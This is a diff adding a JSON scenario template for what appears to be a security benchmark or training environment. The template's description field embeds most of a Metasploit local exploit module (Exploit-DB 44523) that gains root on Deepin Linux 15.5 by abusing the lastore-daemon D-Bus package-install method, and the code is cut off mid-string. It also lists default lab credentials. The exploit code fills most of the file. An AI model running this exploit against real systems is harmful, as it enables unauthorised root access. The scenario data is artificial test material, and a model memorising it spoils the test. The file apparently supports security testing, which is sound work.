@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_44523",
+  "category": "A5_dbus",
+  "attack_technique": "T1068",
+  "cwe": "CWE-269",
+  "description": "Linux privilege escalation: lastore-daemon D-Bus - Privilege Escalation (Metasploit)\n\nExploit source code (44523.rb):\n```\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'lastore-daemon D-Bus Privilege Escalation',\n      'Description'    => %q{\n        This module attempts to gain root privileges on Deepin Linux systems\n        by using lastore-daemon to install a package.\n\n        The lastore-daemon D-Bus configuration on Deepin Linux 15.5 permits any\n        user in the sudo group to install arbitrary system packages without\n        providing a password, resulting in code execution as root. By default,\n        the first user created on the system is a member of the sudo group.\n\n        This module has been tested successfully with lastore-daemon version\n        0.9.53-1 on Deepin Linux 15.5 (x64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          \"King's Way\",   # Discovery and exploit\n          'Brendan Coles' # Metasploit\n        ],\n      'DisclosureDate' => 'Feb 2 2016',\n      'References'     =>\n        [\n          [ 'EDB', '39433' ],\n          [ 'URL', 'https://gist.github.com/bcoles/02aa274ce32dc350e34b6d4d1ad0e0e8' ],\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'DefaultTarget'  => 0))\n    register_options([\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ])\n  end\n\n  def base_dir\n    datastore['WritableDir']\n  end\n\n  def mkdir(path)\n    vprint_status \"Creating '#{path}' directory\"\n    cmd_exec \"mkdir -p #{path}\"\n    register_dir_for_cleanup path\n  end\n\n  def upload(path, data)\n    print_status \"Writing '#{path}' (#{data.size} bytes) ...\"\n    rm_f path\n    write_file path, data\n    register_file_for_cleanup path\n  end\n\n  def upload_and_chmodx(path, data)\n    upload path, data\n    cmd_exec \"chmod +x '#{path}'\"\n  end\n\n  def command_exists?(cmd)\n    cmd_exec(\"command -v #{cmd} && echo true\").include? 'true'\n  end\n\n  def dbus_priv?\n    res = install_package '', ''\n    (res.include? 'DBus.Error.AccessDenied') ? false : true\n  end\n\n  def install_package(name, path)\n    dbus_send dest: 'com.deepin.lastore',\n              type: 'method_call',\n              path: '/com/deepin/lastore',\n              interface: 'com.deepin.lastore.Manager.InstallPackage',\n              contents: \"string:'#{name}' string:'#{path}'\"\n  end\n\n  def remove_package(name)\n    dbus_send dest: 'com.deepin.lastore',\n              type: 'method_call',\n              path: '/com/deepin/lastore',\n              interface: 'com.deepin.lastore.Manager.RemovePackage',\n              contents: \"strin\n```",
+  "cve": "",
+  "exploitdb_id": "44523",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_44523",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
